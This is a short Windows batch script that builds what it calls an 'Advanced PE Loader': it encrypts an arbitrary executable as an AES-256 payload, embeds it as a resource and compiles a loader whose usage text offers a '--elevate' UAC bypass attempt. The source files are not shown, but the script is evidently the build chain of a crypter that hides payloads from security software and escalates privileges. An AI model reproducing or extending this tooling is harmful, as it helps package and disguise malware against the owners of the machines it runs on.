@echo off
cls
echo ========================================
echo   Advanced PE Loader Build System
echo ========================================
echo.

REM Check for out.exe
if not exist out.exe (
    echo [ERROR] out.exe not found!
    pause
    exit /b 1
)

echo [1/5] Compiling encryption tool...
cl /nologo /EHsc encrypt_payload.cpp /Fe:encrypt_tool.exe
if errorlevel 1 goto error

echo [2/5] Encrypting payload with AES-256...
encrypt_tool.exe out.exe encrypted_payload.bin
if errorlevel 1 goto error

echo [3/5] Compiling resource file...
rc /nologo resource.rc
if errorlevel 1 goto error

echo [4/5] Compiling advanced loader...
cl /nologo /EHsc /D_UNICODE /DUNICODE loader_advanced.cpp resource.res ole32.lib oleaut32.lib /Fe:loader.exe
if errorlevel 1 goto error

echo [5/5] Cleaning up...
del /q *.obj encrypt_tool.exe 2>nul

echo.
echo ========================================
echo   BUILD SUCCESSFUL!
echo ========================================
echo.
echo Output: loader.exe
echo.
echo Usage:
echo   loader.exe              - Normal execution
echo   loader.exe --elevate    - UAC bypass attempt
echo.
pause
goto end

:error
echo.
echo [ERROR] Build failed!
pause

:end
